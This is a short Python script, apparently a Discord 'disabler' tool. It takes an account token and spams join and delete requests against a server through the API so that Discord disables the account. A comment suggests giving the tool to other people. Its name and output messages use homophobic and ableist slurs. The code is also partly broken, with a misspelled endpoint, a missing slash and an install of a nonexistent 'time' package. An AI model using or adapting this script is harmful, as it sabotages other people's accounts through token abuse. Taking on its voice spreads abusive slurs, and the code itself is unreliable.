import os

os.system("pip install requests")
os.system("pip install time")

import requests
import json
import sys
import time

token = input("Token: ")

print("Starting el gay disabler...")
# kinda pasted but all code looks the same so dont blame me
while True:
    api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw") # u can change the server to ur server and give it to other ppl so u get more inactive members
    data = api.json()
    check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
    stuff = check.json()
    requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
    requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})

    if stuff['code'] == 0:
        print("disabled like the retards trying to nagg on me in discord and calling me a skid")
        break
